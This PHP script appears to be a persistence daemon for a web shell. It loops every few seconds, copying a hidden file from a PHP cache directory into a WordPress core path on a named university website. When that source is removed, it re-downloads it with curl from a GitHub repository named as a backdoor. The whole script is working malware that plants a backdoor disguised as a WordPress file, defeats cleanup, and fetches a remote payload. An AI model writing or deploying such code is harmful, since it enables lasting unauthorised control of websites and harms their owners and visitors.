<?php
$SRC_FILE   = "/var/cache/php-eaccelerator/phpini.php";
$DST_FILE   = "/home/u812229323/domains/fai.unissula.ac.id/public_html/wp-includes/Requests/library/request.php";
$SLEEP_SEC  = 3;
$TMP_SUFFIX = ".restore_tmp";
$DOWNLOAD_URL = "https://raw.githubusercontent.com/aexdyhaxor/shellbackdoor/refs/heads/main/bypascloudfare.php";

function logmsg($msg) {
    $ts = date("Y-m-d H:i:s");
    file_put_contents("php://stderr", "[$ts] $msg\n", FILE_APPEND);
}

function mkdir_p($path, $mode = 0755) {
    if (!is_dir($path)) {
        if (!mkdir($path, $mode, true)) {
            return false;
        }
        chmod($path, $mode);
    }
    return true;
}

function files_equal($a, $b) {
    if (!file_exists($a) || !file_exists($b)) return false;

    if (filesize($a) !== filesize($b)) return false;

    $fa = fopen($a, "rb");
    $fb = fopen($b, "rb");

    if (!$fa || !$fb) return null;

    while (!feof($fa)) {
        $ba = fread($fa, 8192);
        $bb = fread($fb, 8192);
        if ($ba !== $bb) {
            fclose($fa);
            fclose($fb);
            return false;
        }
    }

    fclose($fa);
    fclose($fb);
    return true;
}

function atomic_copy($src, $dst, $tmp_suffix) {
    if (!file_exists($src)) return array(-1, "src-missing");

    $tmp = $dst . $tmp_suffix . "." . getmypid();
    $dir = dirname($dst);

    if (!mkdir_p($dir, 0755)) {
        return array(-2, "mkdir-failed");
    }

    $in = fopen($src, "rb");
    $out = fopen($tmp, "wb");

    if (!$in || !$out) return array(-3, "open-failed");

    while (!feof($in)) {
        fwrite($out, fread($in, 8192));
    }

    fflush($out);
    fclose($in);
    fclose($out);

    @chmod($tmp, fileperms($src) & 0777);

    if (!rename($tmp, $dst)) {
        @unlink($tmp);
        return array(-4, "rename-failed");
    }

    return array(0, null);
}

function try_redownload_source($download_url, $src_file) {
    logmsg("source hilang – mencoba download ulang dari $download_url");

    // coba curl
    $cmd = "curl -s -L -o " . escapeshellarg($src_file) . " " . escapeshellarg($download_url);
    $rc = shell_exec($cmd);

    if (file_exists($src_file) && filesize($src_file) > 0) {
        return true;
    }

    // fallback file_get_contents
    $data = @file_get_contents($download_url);
    if ($data !== false) {
        file_put_contents($src_file, $data);
        return true;
    }

    return false;
}

logmsg("Restore daemon started: $SRC_FILE → $DST_FILE (interval $SLEEP_SEC sec)");

while (true) {

    $dst_dir = dirname($DST_FILE);
    if (!mkdir_p($dst_dir, 0755)) {
        logmsg("gagal membuat dir: $dst_dir");
        sleep($SLEEP_SEC);
        continue;
    }

    if (!file_exists($SRC_FILE)) {
        logmsg("source hilang: $SRC_FILE");

        if ($DOWNLOAD_URL) {
            if (try_redownload_source($DOWNLOAD_URL, $SRC_FILE)) {
                logmsg("download source OK");
            } else {
                logmsg("download source gagal");
            }
        }

        sleep($SLEEP_SEC);
        continue;
    }

    $do_copy = true;

    if (file_exists($DST_FILE)) {
        $eq = files_equal($SRC_FILE, $DST_FILE);
        if ($eq === true) {
            logmsg("source identik → skip overwrite");
            $do_copy = false;
        }
    }

    if ($do_copy) {
        list($rc, $err) = atomic_copy($SRC_FILE, $DST_FILE, $TMP_SUFFIX);
        if ($rc === 0) {
            logmsg("restore OK: $SRC_FILE → $DST_FILE");
        } else {
            logmsg("restore gagal ($rc): $err");
        }
    }

    sleep($SLEEP_SEC);
}
?>
